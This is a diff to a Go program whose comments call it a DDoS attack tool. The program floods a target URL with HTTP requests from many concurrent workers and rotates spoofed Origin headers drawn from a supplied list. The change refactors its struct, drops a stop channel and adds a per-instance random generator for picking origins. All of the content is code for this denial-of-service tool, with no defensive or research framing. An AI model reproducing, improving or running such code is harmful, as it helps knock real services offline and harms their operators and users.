@@ -15,16 +15,16 @@ import (
 // DDoS - structure of value for DDoS attack
 type DDoS struct {
 	url           string
-	stop          *chan bool
 	amountWorkers int
+	method        string
+	body          string
+	origins       []string
+	randGen       *rand.Rand
 
 	// Statistic
 	successRequest    int64
 	amountRequests    int64
 	successRequest200 int64
-	method            string
-	body              string
-	origins           []string
 }
 
 // New - initialization of new DDoS attack
@@ -36,10 +36,9 @@ func New(URL string, workers int, method, body string, origins []string) (*DDoS,
 	if err != nil || len(u.Host) == 0 {
 		return nil, fmt.Errorf("undefined host or error = %v", err)
 	}
-	s := make(chan bool)
+	randGen := rand.New(rand.NewSource(time.Now().UnixNano()))
 	return &DDoS{
 		url:               URL,
-		stop:              &s,
 		amountWorkers:     workers,
 		method:            method,
 		body:              body,
@@ -47,6 +46,7 @@ func New(URL string, workers int, method, body string, origins []string) (*DDoS,
 		amountRequests:    0,
 		successRequest200: 0,
 		origins:           origins,
+		randGen:           randGen,
 	}, nil
 }
 func fetchURL(wg *sync.WaitGroup, d *DDoS) ([]byte, error) {
@@ -60,7 +60,7 @@ func fetchURL(wg *sync.WaitGroup, d *DDoS) ([]byte, error) {
 		req, err = http.NewRequest(d.method, d.url, bytes.NewBuffer([]byte(d.body)))
 		req.Header.Set("Content-Type", "application/json")
 	}
-	origin := d.origins[rand.Intn(len(d.origins))]
+	origin := d.origins[d.randGen.Intn(len(d.origins))]
 	req.Header.Set("Origin", origin)
 
 	if err != nil {
@@ -88,7 +88,6 @@ func fetchURL(wg *sync.WaitGroup, d *DDoS) ([]byte, error) {
 
 // Run - run DDoS attack
 func (d *DDoS) Run() {
-	rand.Seed(time.Now().UnixNano())
 	var wg sync.WaitGroup
 
 	for i := 0; i < d.amountWorkers; i++ {
